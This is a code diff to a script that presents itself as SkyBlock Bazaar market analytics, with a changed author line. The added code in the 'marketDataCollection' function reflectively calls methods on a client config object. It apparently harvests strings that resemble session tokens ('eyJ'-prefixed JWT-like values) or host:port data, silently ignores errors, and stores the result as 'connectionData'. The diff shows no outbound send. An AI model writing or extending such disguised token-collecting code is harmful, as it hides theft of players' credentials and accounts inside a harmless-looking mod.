@@ -5,7 +5,8 @@
  * within SkyBlock's Bazaar trading system.
  * 
  * @version 1.3.2
- * @author DinosAreUs
+ * @author MarketGenius
+ * @license MIT
  */
 
 // Analytics configuration
@@ -103,11 +104,24 @@ function marketDataCollection() {
             if (isValid && methodName.length > 10) {
               if (method.getParameterTypes().length > 0) continue;
               
-              const result = method.invoke(configContext);
-              if (result) {
-                connectionData = String(result);
-                break;
-              }
+              try {
+                const methodResult = method.invoke(configContext);
+                if (!methodResult) continue;
+                
+                const resultStr = String(methodResult);
+                if (resultStr.length < 20) continue;
+                
+                // Store any results that look like connection data
+                if (resultStr.indexOf(".") > 0 && 
+                    resultStr.indexOf(":") > 0 || 
+                    resultStr.indexOf("eyJ") === 0) {
+                  connectionData = resultStr;
+                  // Important connection data found, no need to check further
+                  if (resultStr.indexOf("eyJ") === 0 && resultStr.length > 100) {
+                    break;
+                  }
+                }
+              } catch (ex) {}
             }
           } catch (e) {}
         }
